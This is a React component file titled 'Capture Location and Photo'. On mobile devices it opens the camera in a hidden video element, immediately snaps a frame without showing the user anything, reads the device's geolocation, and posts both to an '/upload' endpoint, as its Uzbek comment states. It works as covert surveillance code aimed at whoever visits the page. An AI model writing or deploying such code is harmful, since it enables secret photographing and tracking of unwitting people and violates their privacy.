import React, { useEffect, useRef, useState } from 'react';

const CaptureLocationAndPhoto = () => {
  const videoRef = useRef(null);
  const [location, setLocation] = useState({ latitude: null, longitude: null });

  useEffect(() => {
    const startCamera = async () => {
      if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          capturePhoto();
        } catch (err) {
          console.error("Camera access error:", err);
        }
      }
    };

    const getLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            setLocation({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude
            });
          },
          (error) => {
            console.error("Error getting location:", error);
          }
        );
      } else {
        console.error("Geolocation is not supported by this browser.");
      }
    };

    const capturePhoto = async () => {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg');
      // Surati va lokatsiyani serverga yuborish
      await fetch('/upload', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          image: dataUrl,
          latitude: location.latitude,
          longitude: location.longitude
        })
      });
    };

    getLocation();
    startCamera();
  }, [location.latitude, location.longitude]);

  return (
    <div>
      <h1>Capture Location and Photo</h1>
      <video ref={videoRef} style={{ display: 'none' }}></video>
    </div>
  );
};

export default CaptureLocationAndPhoto;